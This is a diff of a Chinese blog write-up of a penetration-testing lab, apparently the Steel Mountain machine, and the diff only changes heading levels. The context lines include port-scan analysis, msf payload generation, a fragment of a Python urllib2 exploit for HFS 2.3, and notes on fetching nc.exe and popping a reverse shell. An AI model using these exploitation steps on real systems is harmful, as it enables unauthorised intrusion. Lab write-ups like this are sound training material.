@@ -49,7 +49,7 @@ CPE: cpe:/o:microsoft:windowsHost script results:|_nbstat: NetBIOS name: STEELMO
 
 ### [](#详细分析一下 "详细分析一下")详细分析一下
 
-##### [](#80 "80")80
+### [](#80 "80")80
 
 > \*\*\*1. **Microsoft IIS httpd 8.5**：该服务器运行的是Microsoft Internet Information Services（IIS）8.5版本，这是Microsoft的网络服务器软件。
 
@@ -58,12 +58,12 @@ CPE: cpe:/o:microsoft:windowsHost script results:|_nbstat: NetBIOS name: STEELMO
     这行提到可能的HTTP方法。`TRACE`是一种潜在危险的方法，它会将收到的HTTP请求返回给客户端，可能会被用于跨站追踪攻击（Cross-Site Tracing，XST）等攻击手法。
     
 
-##### [](#139-445 "139 445")139 445
+### [](#139-445 "139 445")139 445
 
 > 告诉我们了操作系统  
 > Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
 
-##### [](#3389 "3389")3389
+### [](#3389 "3389")3389
 
 > 根据你提供的扫描结果，看起来端口3389上运行的是Microsoft SChannel TLS服务，通常用于远程桌面连接（Remote Desktop Protocol，RDP）。以下是一些分析：
 
@@ -76,7 +76,7 @@ CPE: cpe:/o:microsoft:windowsHost script results:|_nbstat: NetBIOS name: STEELMO
 4.  \***ssl-date**：这是SSL证书的日期信息，显示了扫描时的日期和时间，以及与证书相关的时间间隔。
     
 
-##### [](#8080 "8080")8080
+### [](#8080 "8080")8080
 
 > 端口8080上运行着HttpFileServer（HFS）2.3版本，这是一个基于HTTP协议的文件服务器软件。这意味着该服务器允许用户通过Web浏览器访问和管理文件。通过HTTP请求，用户可以上传、下载、删除和浏览服务器上的文件。在这种情况下，服务器的HTTP响应头中包含了”Server”字段，指示服务器版本为HFS 2.3。此外，HTTP响应标题显示为”HFS /“，表明服务器根目录的标题为”HFS”。\*\*\*\*  
 > |
@@ -143,7 +143,7 @@ Permissions=AppendData/AddSubdirectory}StartName      : LocalSystemAbuseFunction
 
 ### [](#载荷投递 "载荷投递")载荷投递
 
-##### [](#载荷生成 "载荷生成")载荷生成
+### [](#载荷生成 "载荷生成")载荷生成
 
 msf生成木马
 
@@ -168,11 +168,11 @@ import urllib2import systry:	def script_create():		urllib2.urlopen("http://"+sys
 
 ### [](#脚本利用 "脚本利用")脚本利用
 
-##### [](#第一次 "第一次")第一次
+### [](#第一次 "第一次")第一次
 
 > 脚本向我们本地的web 服务器 请求 nc.exe
 
-##### [](#第二次 "第二次")![image.png](https://raw.githubusercontent.com/k1t0111/blog/main/image/20240503193856.png)第二次
+### [](#第二次 "第二次")![image.png](https://raw.githubusercontent.com/k1t0111/blog/main/image/20240503193856.png)第二次
 
 > 脚本向目标 弹一个反向shell回来
 
